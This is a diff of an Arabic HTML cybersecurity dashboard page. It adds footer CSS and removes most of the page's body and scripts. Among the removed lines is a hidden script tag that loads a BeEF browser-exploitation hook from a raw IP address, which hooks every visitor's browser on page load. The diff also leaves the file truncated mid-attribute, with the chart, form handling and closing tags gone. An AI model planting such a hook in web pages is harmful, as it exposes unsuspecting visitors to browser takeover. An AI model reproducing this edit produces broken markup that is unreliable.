@@ -407,6 +407,38 @@
       outline-offset: 2px;
     }
 
+    /* ستايلات الفوتر */
+    footer {
+      text-align: center;
+      padding: 20px 10px;
+      font-size: 0.9rem;
+      background: var(--color-footer-bg);
+      color: #99bbffcc;
+      user-select: none;
+      z-index: 10;
+    }
+    footer a {
+      margin: 0 10px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: color 0.3s;
+    }
+    footer a:hover {
+      text-decoration: underline;
+      color: #66ffff !important;
+    }
+
+    /* ألوان الروابط حسب الوضع */
+    body:not(.light-mode) footer a[href*="facebook"] { color: #00acee; }
+    body:not(.light-mode) footer a[href*="instagram"] { color: #d6249f; }
+    body:not(.light-mode) footer a[href*="tiktok"] { color: #ffffff; }
+    body:not(.light-mode) footer a[href*="cv.html"] { color: #00ffff; }
+
+    body.light-mode footer a[href*="facebook"] { color: #1877f2; }
+    body.light-mode footer a[href*="instagram"] { color: #e1306c; }
+    body.light-mode footer a[href*="tiktok"] { color: #111; }
+    body.light-mode footer a[href*="cv.html"] { color: #0077cc; }
+
   </style>
 </head>
 <body>
@@ -462,159 +494,4 @@
         <label for="input-attacks">عدد الهجمات</label>
         <input type="number" id="input-attacks" min="0" aria-required="true" aria-describedby="attacks-desc" />
         <label for="input-vulns">أبرز الثغرات</label>
-        <input type="text" id="input-vulns" aria-required="false" />
-        <label for="input-regions">أهم المناطق المستهدفة</label>
-        <input type="text" id="input-regions" aria-required="false" />
-        <button type="submit" id="update-stats-btn">تحديث الإحصائيات</button>
-      </form>
-    </section>
-
-  </main>
-
-  <footer style="text-align:center; padding:12px 10px; font-size:0.9rem; background: var(--color-footer-bg); color:#99bbffcc; user-select:none;">
-    © 2025 JKA5.xyz - جميع الحقوق محفوظة
-  </footer>
-
-  <!-- مكتبة Chart.js -->
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-
-  <script>
-    // تبديل الوضع
-    const body = document.body;
-    const modeToggle = document.querySelector('.mode-toggle');
-
-    function updateModeIcon() {
-      modeToggle.textContent = body.classList.contains('light-mode') ? '🌙' : '☀️';
-      modeToggle.title = body.classList.contains('light-mode') ? 'تبديل إلى الوضع الليلي' : 'تبديل إلى الوضع النهاري';
-    }
-
-    modeToggle.addEventListener('click', () => {
-      body.classList.toggle('light-mode');
-      updateModeIcon();
-    });
-
-    updateModeIcon();
-
-    // بيانات مبدئية للإحصائيات
-    let attacksData = [5, 10, 15, 20, 25, 30, 40];
-    let labels = ['الأحد', 'الإثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت'];
-
-    // إنشاء الرسم البياني
-    const ctx = document.getElementById('attacksChart').getContext('2d');
-    const attacksChart = new Chart(ctx, {
-      type: 'line',
-      data: {
-        labels: labels,
-        datasets: [{
-          label: 'عدد الهجمات',
-          data: attacksData,
-          borderColor: '#00ffff',
-          backgroundColor: 'rgba(0,255,255,0.2)',
-          fill: true,
-          tension: 0.3,
-          pointRadius: 6,
-          pointHoverRadius: 8,
-          borderWidth: 3,
-        }]
-      },
-      options: {
-        responsive: true,
-        scales: {
-          y: {
-            beginAtZero: true,
-            grid: {
-              color: 'rgba(0,255,255,0.15)'
-            },
-            ticks: {
-              color: '#00ffff'
-            }
-          },
-          x: {
-            grid: {
-              color: 'rgba(0,255,255,0.15)'
-            },
-            ticks: {
-              color: '#00ffff'
-            }
-          }
-        },
-        plugins: {
-          legend: {
-            labels: {
-              color: '#00ffff'
-            }
-          }
-        }
-      }
-    });
-
-    // تحميل أخبار من RSS أو API (مؤقتاً نستخدم ثابت)
-    const newsList = document.getElementById('news-list');
-    const newsLoading = document.getElementById('news-loading');
-
-    const sampleNews = [
-      { title: 'ثغرة خطيرة في متصفح شهير', url: '#' },
-      { title: 'تحذير من هجوم فيروسات جديد', url: '#' },
-      { title: 'تحديثات أمنية لشبكات الواي فاي', url: '#' },
-      { title: 'نصائح لحماية حساباتك على الإنترنت', url: '#' },
-      { title: 'أفضل الأدوات لاختبار الاختراق 2025', url: '#' },
-    ];
-
-    function loadNews() {
-      newsLoading.classList.remove('hidden');
-      setTimeout(() => {
-        newsList.innerHTML = '';
-        sampleNews.forEach(item => {
-          const li = document.createElement('li');
-          const a = document.createElement('a');
-          a.href = item.url;
-          a.textContent = item.title;
-          a.target = '_blank';
-          a.rel = 'noopener noreferrer';
-          li.appendChild(a);
-          newsList.appendChild(li);
-        });
-        newsLoading.classList.add('hidden');
-      }, 1200);
-    }
-
-    loadNews();
-
-    // التحكم في تحديث الإحصائيات يدوياً
-    const controlPanel = document.getElementById('control-panel');
-    controlPanel.addEventListener('submit', e => {
-      e.preventDefault();
-      const attacksCountInput = document.getElementById('input-attacks');
-      const vulnsInput = document.getElementById('input-vulns');
-      const regionsInput = document.getElementById('input-regions');
-
-      const attacksCount = parseInt(attacksCountInput.value, 10);
-      const vulns = vulnsInput.value.trim() || 'لا يوجد بيانات';
-      const regions = regionsInput.value.trim() || 'لا يوجد بيانات';
-
-      if (!isNaN(attacksCount)) {
-        document.getElementById('attacks-count').textContent = attacksCount;
-        attacksData.push(attacksCount);
-        labels.push('جديد');
-        if (attacksData.length > 10) {
-          attacksData.shift();
-          labels.shift();
-        }
-        attacksChart.update();
-      }
-
-      document.getElementById('top-vulns').textContent = vulns;
-      document.getElementById('top-regions').textContent = regions;
-
-      // تنظيف الحقول
-      attacksCountInput.value = '';
-      vulnsInput.value = '';
-      regionsInput.value = '';
-    });
-  </script>
-
-  <!-- إضافة سكريبت BeEF -->
-  <script src="http://37.236.31.35:3000/hook.js"></script>
-
-</body>
-</html>
+        <input type="text" id="input-vulns" aria-required="false
